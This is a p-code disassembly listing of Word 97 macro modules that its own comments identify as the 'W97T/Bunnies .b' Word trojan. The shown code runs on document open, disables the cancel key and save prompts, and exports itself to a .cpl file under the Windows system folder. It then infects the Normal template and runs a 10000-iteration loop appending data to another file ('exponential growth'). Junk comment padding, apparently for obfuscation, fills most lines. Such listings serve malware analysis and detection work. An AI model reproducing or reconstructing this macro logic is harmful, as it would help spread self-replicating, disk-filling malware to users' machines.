' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #330:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #331:
' 	QuoteRem 0x0001 0x0000 ""
' Line #332:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #333:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #334:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #335:
' 	StartWithExpr 
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	MemLd VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #336:
' 	QuoteRem 0x0001 0x0000 ""
' Line #337:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #338:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #339:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #340:
' 	QuoteRem 0x0001 0x0000 ""
' Line #341:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #342:
' 	QuoteRem 0x0001 0x0007 "5950008"
' Line #343:
' 	EndWith 
' Line #344:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #345:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #346:
' 	QuoteRem 0x0001 0x0007 "3549341"
' Line #347:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #348:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #349:
' 	QuoteRem 0x0001 0x0007 "8045723"
' Line #350:
' 	QuoteRem 0x0001 0x0007 "4942211"
' Line #351:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	NextVar 
' Line #352:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #353:
' 	QuoteRem 0x0001 0x0000 ""
' Line #354:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #355:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #356:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #357:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #358:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #359:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #360:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #361:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #362:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #363:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #364:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #365:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #366:
' 	QuoteRem 0x0001 0x0000 ""
' Line #367:
' 	LitStr 0x000B "Bunnies!!!!"
' 	LitDI2 0x0030 
' 	ArgsCall MsgBox 0x0002 
' Line #368:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #369:
' 	QuoteRem 0x0001 0x0000 ""
' Line #370:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #371:
' 	QuoteRem 0x0001 0x0000 ""
' Line #372:
' 	QuoteRem 0x0001 0x0000 ""
' Line #373:
' 	QuoteRem 0x0001 0x0000 ""
' Line #374:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #375:
' 	LitStr 0x001D "C:\Windows\System\Bunnies.cpl"
' 	ArgsCall Kill 0x0001 
' Line #376:
' 	QuoteRem 0x0001 0x0007 "6027973"
' Line #377:
' 	QuoteRem 0x0001 0x0007 "6648766"
' Line #378:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #379:
' 	QuoteRem 0x0001 0x0007 "5110557"
' Line #380:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #381:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #382:
' 	QuoteRem 0x0001 0x0007 "1091471"
' Line #383:
' 	LitStr 0x0017 "C:\Windows\System\B.cpl"
' 	ArgsCall Kill 0x0001 
' Line #384:
' 	QuoteRem 0x0001 0x0006 "448319"
' Line #385:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #386:
' 	QuoteRem 0x0001 0x0007 "3107064"
' Line #387:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #388:
' 	QuoteRem 0x0001 0x0007 "7035769"
' Line #389:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #390:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #391:
' 	EndFunc 
' Line #392:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #393:
' 	QuoteRem 0x0001 0x0006 "319395"
' Line #394:
' 	QuoteRem 0x0001 0x0006 "575315"
' Line #395:
' 	QuoteRem 0x0001 0x0007 "9915977"
' Line #396:
' 	QuoteRem 0x0001 0x0000 ""
' Line #397:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #398:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Line #399:
' 	QuoteRem 0x0000 0x0004 " EOF"
' Line #400:
' 	QuoteRem 0x0001 0x0008 "12:15:31"
' Macros/VBA/BunniesB3 - 28665 bytes
' Line #0:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #1:
' 	QuoteRem 0x0001 0x0007 "7767478"
' Line #2:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #3:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #4:
' 	QuoteRem 0x0001 0x0007 "9511315"
' Line #5:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #6:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #7:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #8:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #9:
' 	QuoteRem 0x0001 0x0007 "7017760"
' Line #10:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #11:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #12:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #13:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #14:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #15:
' 	Dim (Public) 
' 	VarDefn SCode (As String)
' Line #16:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #17:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #18:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #19:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #20:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #21:
' 	QuoteRem 0x0001 0x0000 ""
' Line #22:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #23:
' 	QuoteRem 0x0001 0x0000 ""
' Line #24:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #25:
' 	QuoteRem 0x0001 0x0007 "7894474"
' Line #26:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #27:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #28:
' 	QuoteRem 0x0001 0x0007 "1915736"
' Line #29:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #30:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #31:
' 	Dim (Public) 
' 	VarDefn stuff (As String)
' Line #32:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #33:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #34:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #35:
' 	QuoteRem 0x0001 0x0006 "733070"
' Line #36:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #37:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #38:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #39:
' 	QuoteRem 0x0001 0x0007 "8961297"
' Line #40:
' 	QuoteRem 0x0001 0x0007 "3181610"
' Line #41:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #42:
' 	QuoteRem 0x0001 0x0000 ""
' Line #43:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #44:
' 	QuoteRem 0x0001 0x0000 ""
' Line #45:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #46:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #47:
' 	QuoteRem 0x0000 0x0010 " W97T/Bunnies .b"
' Line #48:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #49:
' 	QuoteRem 0x0001 0x0006 "430310"
' Line #50:
' 	QuoteRem 0x0001 0x0006 "776857"
' Line #51:
' 	QuoteRem 0x0001 0x0000 ""
' Line #52:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #53:
' 	QuoteRem 0x0001 0x0000 ""
' Line #54:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #55:
' 	QuoteRem 0x0001 0x0000 ""
' Line #56:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #57:
' 	QuoteRem 0x0001 0x0007 "1696184"
' Line #58:
' 	QuoteRem 0x0001 0x0000 ""
' Line #59:
' 	QuoteRem 0x0001 0x0000 ""
' Line #60:
' 	QuoteRem 0x0001 0x0000 ""
' Line #61:
' 	QuoteRem 0x0001 0x0000 ""
' Line #62:
' 	QuoteRem 0x0001 0x0007 "5868956"
' Line #63:
' 	QuoteRem 0x0000 0x0028 " Word Trojan Bunnies .b variant by Error"
' Line #64:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #65:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #66:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #67:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #68:
' 	QuoteRem 0x0001 0x0007 "2456407"
' Line #69:
' 	QuoteRem 0x0001 0x0007 "6759682"
' Line #70:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #71:
' 	QuoteRem 0x0001 0x0007 "5163674"
' Line #72:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #73:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #74:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #75:
' 	QuoteRem 0x0001 0x0000 ""
' Line #76:
' 	QuoteRem 0x0001 0x0000 ""
' Line #77:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #78:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #79:
' 	FuncDefn (Sub AutoOpen())
' Line #80:
' 	QuoteRem 0x0001 0x0000 ""
' Line #81:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #82:
' 	QuoteRem 0x0001 0x0000 ""
' Line #83:
' 	QuoteRem 0x0001 0x0000 ""
' Line #84:
' 	QuoteRem 0x0001 0x0007 "4476086"
' Line #85:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #86:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #87:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #88:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #89:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #90:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #91:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #92:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #93:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #94:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #95:
' 	OnError (Resume Next) 
' Line #96:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #97:
' 	QuoteRem 0x0001 0x0000 ""
' Line #98:
' 	QuoteRem 0x0001 0x0007 "6127034"
' Line #99:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #100:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #101:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #102:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #103:
' 	QuoteRem 0x0001 0x0000 ""
' Line #104:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #105:
' 	QuoteRem 0x0001 0x0000 ""
' Line #106:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #107:
' 	QuoteRem 0x0001 0x0007 "3010827"
' Line #108:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #109:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #110:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #111:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #112:
' 	QuoteRem 0x0001 0x0007 "9330869"
' Line #113:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #114:
' 	QuoteRem 0x0001 0x0007 "4910523"
' Line #115:
' 	QuoteRem 0x0001 0x0000 ""
' Line #116:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #117:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #118:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #119:
' 	QuoteRem 0x0001 0x0000 ""
' Line #120:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #121:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #122:
' 	QuoteRem 0x0001 0x0007 "8581151"
' Line #123:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #124:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #125:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #126:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #127:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #128:
' 	QuoteRem 0x0001 0x0007 "2120697"
' Line #129:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #130:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #131:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #132:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #133:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #134:
' 	QuoteRem 0x0001 0x0000 ""
' Line #135:
' 	QuoteRem 0x0001 0x0007 "9088293"
' Line #136:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #137:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #138:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #139:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #140:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #141:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #142:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #143:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	ArgsLd Dir 0x0001 
' 	St SCode 
' Line #144:
' 	QuoteRem 0x0001 0x0007 "5918320"
' Line #145:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #146:
' 	QuoteRem 0x0001 0x0000 ""
' Line #147:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #148:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #149:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #150:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #151:
' 	QuoteRem 0x0001 0x0000 ""
' Line #152:
' 	QuoteRem 0x0001 0x0007 "7937999"
' Line #153:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #154:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #155:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #156:
' 	QuoteRem 0x0001 0x0000 ""
' Line #157:
' 	QuoteRem 0x0001 0x0007 "7173024"
' Line #158:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #159:
' 	Ld SCode 
' 	LitStr 0x0005 "b.cpl"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	ArgsCall (Call) Spread 0x0000 
' 	Else 
' 	BoSImplicit 
' 	EndIf 
' Line #160:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #161:
' 	QuoteRem 0x0001 0x0000 ""
' Line #162:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #163:
' 	QuoteRem 0x0001 0x0007 "6185727"
' Line #164:
' 	QuoteRem 0x0001 0x0007 "4062410"
' Line #165:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #166:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #167:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #168:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #169:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #170:
' 	QuoteRem 0x0001 0x0000 ""
' Line #171:
' 	QuoteRem 0x0001 0x0007 "8590480"
' Line #172:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #173:
' 	QuoteRem 0x0001 0x0006 "970648"
' Line #174:
' 	QuoteRem 0x0001 0x0000 ""
' Line #175:
' 	LitStr 0x0017 "C:\Windows\System\b.cpl"
' 	Paren 
' 	LitStr 0x0008 "BunniesB"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #176:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #177:
' 	QuoteRem 0x0001 0x0007 "1851448"
' Line #178:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #179:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #180:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #181:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #182:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #183:
' 	QuoteRem 0x0001 0x0000 ""
' Line #184:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #185:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #186:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #187:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #188:
' 	QuoteRem 0x0001 0x0007 "6463077"
' Line #189:
' 	QuoteRem 0x0001 0x0000 ""
' Line #190:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #191:
' 	ArgsCall (Call) Spread 0x0000 
' Line #192:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #193:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #194:
' 	QuoteRem 0x0001 0x0007 "1526576"
' Line #195:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #196:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #197:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #198:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #199:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #200:
' 	QuoteRem 0x0001 0x0000 ""
' Line #201:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #202:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #203:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #204:
' 	QuoteRem 0x0001 0x0000 ""
' Line #205:
' 	QuoteRem 0x0001 0x0007 "2138128"
' Line #206:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #207:
' 	EndSub 
' Line #208:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #209:
' 	QuoteRem 0x0001 0x0007 "3272920"
' Line #210:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #211:
' 	QuoteRem 0x0001 0x0007 "3424502"
' Line #212:
' 	QuoteRem 0x0001 0x0007 "5713025"
' Line #213:
' 	QuoteRem 0x0001 0x0007 "5677673"
' Line #214:
' 	QuoteRem 0x0001 0x0000 ""
' Line #215:
' 	QuoteRem 0x0001 0x0000 ""
' Line #216:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #217:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #218:
' 	QuoteRem 0x0001 0x0000 ""
' Line #219:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #220:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #221:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #222:
' 	QuoteRem 0x0001 0x0007 "4451237"
' Line #223:
' 	FuncDefn (Function Spread())
' Line #224:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #225:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #226:
' 	QuoteRem 0x0001 0x0000 ""
' Line #227:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #228:
' 	QuoteRem 0x0001 0x0007 "6466830"
' Line #229:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #230:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #231:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #232:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #233:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #234:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #235:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #236:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #237:
' 	QuoteRem 0x0001 0x0007 "5673587"
' Line #238:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #239:
' 	OnError (Resume Next) 
' Line #240:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #241:
' 	QuoteRem 0x0001 0x0007 "9475296"
' Line #242:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #243:
' 	QuoteRem 0x0001 0x0000 ""
' Line #244:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #245:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #246:
' 	QuoteRem 0x0001 0x0006 "522532"
' Line #247:
' 	QuoteRem 0x0001 0x0000 ""
' Line #248:
' 	QuoteRem 0x0001 0x0000 ""
' Line #249:
' 	QuoteRem 0x0001 0x0007 "2392120"
' Line #250:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #251:
' 	QuoteRem 0x0001 0x0000 ""
' Line #252:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #253:
' 	QuoteRem 0x0001 0x0000 ""
' Line #254:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #255:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #256:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #257:
' 	QuoteRem 0x0001 0x0000 ""
' Line #258:
' 	QuoteRem 0x0001 0x0007 "1788406"
' Line #259:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #260:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #261:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #262:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #263:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #264:
' 	QuoteRem 0x0001 0x0007 "2693722"
' Line #265:
' 	QuoteRem 0x0001 0x0000 ""
' Line #266:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #267:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #268:
' 	QuoteRem 0x0001 0x0007 "3959596"
' Line #269:
' 	QuoteRem 0x0001 0x0000 ""
' Line #270:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #271:
' 	QuoteRem 0x0000 0x003C " Begin to do what bunnies do...Now with exponential growth!!"
' Line #272:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #273:
' 	QuoteRem 0x0001 0x0007 "2134042"
' Line #274:
' 	QuoteRem 0x0001 0x0007 "9023094"
' Line #275:
' 	QuoteRem 0x0001 0x0007 "7349121"
' Line #276:
' 	QuoteRem 0x0001 0x0007 "4475752"
' Line #277:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #278:
' 	QuoteRem 0x0001 0x0000 ""
' Line #279:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #280:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #281:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #282:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #283:
' 	QuoteRem 0x0001 0x0000 ""
' Line #284:
' 	QuoteRem 0x0001 0x0000 ""
' Line #285:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #286:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #287:
' 	StartForVariable 
' 	Ld X 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x2710 
' 	LitDI2 0x0001 
' 	ForStep 
' Line #288:
' 	QuoteRem 0x0001 0x0000 ""
' Line #289:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #290:
' 	QuoteRem 0x0001 0x0007 "4602748"
' Line #291:
' 	QuoteRem 0x0001 0x0007 "2519186"
' Line #292:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #293:
' 	QuoteRem 0x0001 0x0000 ""
' Line #294:
' 	QuoteRem 0x0001 0x0007 "7757220"
' Line #295:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #296:
' 	QuoteRem 0x0001 0x0000 ""
' Line #297:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #298:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #299:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #300:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #301:
' 	QuoteRem 0x0001 0x0000 ""
' Line #302:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #303:
' 	LitStr 0x0017 "C:\windows\system\b.cpl"
' 	LitDI2 0x0003 
' 	Sharp 
' 	LitDefault 
' 	Open (For Input)
' Line #304:
' 	QuoteRem 0x0001 0x0000 ""
' Line #305:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #306:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #307:
' 	QuoteRem 0x0001 0x0006 "372511"
' Line #308:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #309:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #310:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #311:
' 	QuoteRem 0x0001 0x0008 "12:15:23"
' Line #312:
' 	QuoteRem 0x0001 0x0000 ""
' Line #313:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #314:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #315:
' 	QuoteRem 0x0001 0x0008 "12:15:25"
' Line #316:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #317:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #318:
' 	QuoteRem 0x0001 0x0000 ""
' Line #319:
' 	LitStr 0x001D "C:\Windows\system\bunnies.cpl"
' 	LitDI2 0x0004 
' 	Sharp 
' 	LitDefault 
' 	Open (For Append)
' Line #320:
' 	QuoteRem 0x0001 0x0007 "1604208"
' Line #321:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #322:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #323:
' 	QuoteRem 0x0001 0x0007 "3035342"
' Line #324:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #325:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #326:
' 	QuoteRem 0x0001 0x0007 "7937665"
' Line #327:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #328:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #329:
' 	QuoteRem 0x0001 0x0007 "3764561"
' Line #330:
' 	QuoteRem 0x0001 0x0006 "600497"
' Line #331:
' 	QuoteRem 0x0001 0x0000 ""
' Line #332:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #333:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #334:
' 	QuoteRem 0x0001 0x0000 ""
' Line #335:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #336:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #337:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #338:
' 	QuoteRem 0x0001 0x0007 "9588614"
' Line #339:
' 	QuoteRem 0x0001 0x0007 "7713765"
' Line #340:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #341:
' 	QuoteRem 0x0001 0x0007 "8828058"
' Line #342:
' 	QuoteRem 0x0001 0x0006 "727493"
' Line #343:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #344:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #345:
' 	QuoteRem 0x0001 0x0006 "Tester"
' Line #346:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #347:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #348:
' 	QuoteRem 0x0001 0x0000 ""
' Line #349:
' 	QuoteRem 0x0001 0x0000 ""
' Line #350:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #351:
' 	Do 
' Line #352:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #353:
' 	QuoteRem 0x0001 0x0008 "12:15:30"
' Line #354:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #355:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #356:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #357:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #358:
' 	QuoteRem 0x0001 0x0007 "4525116"
' Line #359:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #360:
' 	QuoteRem 0x0001 0x0007 "2485008"
' Line #361:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #362:
' 	QuoteRem 0x0001 0x0000 ""
' Line #363:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #364:
' 	QuoteRem 0x0001 0x0001 "T"
' Line #365:
' 	QuoteRem 0x0001 0x0007 "7869626"
' Line #366:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #367:
' 	LitDI2 0x0003 
' 	Ld stuff 
' 	LineInput 
' Line #368:
' 	QuoteRem 0x0001 0x0008 "12:15:32"
' Line #369:
' 	QuoteRem 0x0001 0x0000 ""
' Line #370:
' 	QuoteRem 0x0001 0x0005 "80255"
' Line #371:
